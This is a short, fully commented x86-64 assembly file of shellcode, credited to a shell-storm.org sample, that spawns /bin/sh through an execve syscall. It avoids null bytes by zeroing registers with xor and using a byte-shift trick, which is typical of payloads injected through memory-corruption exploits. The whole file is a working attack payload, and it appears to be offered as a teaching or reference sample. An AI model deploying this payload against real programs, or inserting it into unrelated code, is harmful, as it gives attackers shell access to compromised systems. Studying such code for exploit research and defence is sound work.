; Inspired by: http://shell-storm.org/shellcode/files/shellcode-76.php

; Do execve("/bin/sh", ["/bin/sh", NULL], NULL) as a syscall.
; Arguments are passed in registers:
;	rdi <- "/bin/sh"
;	rsi <- ["/bin/sh", NULL]
;	rdx <- NULL
; Syscall number (0x3b) is passed in rax register.

BITS 64

xor rdx, rdx					; rdx <- NULL
mov rbx, 0x68732f6e69622fff	 ; rbx <- "hs/nib/" + 0xff
shr rbx, 0x8					; rbx <- 0x00 + "hs/nib/"
push rbx						; Push "/bin/sh" + 0x00 on the stack.
mov rdi, rsp					; rdi <- pointer to "/bin/sh" (NUL-terminated)
xor rax, rax					; rax <- 0
push rax						; Push NULL on the stack.
push rdi						; Push pointer to "/bin/sh".
mov rsi, rsp					; rsi <-> ["/bin/sh", NULL]
mov al, 0x3b					; Store execve syscall number (0x3b) in rax.
syscall						 ; Do syscall.
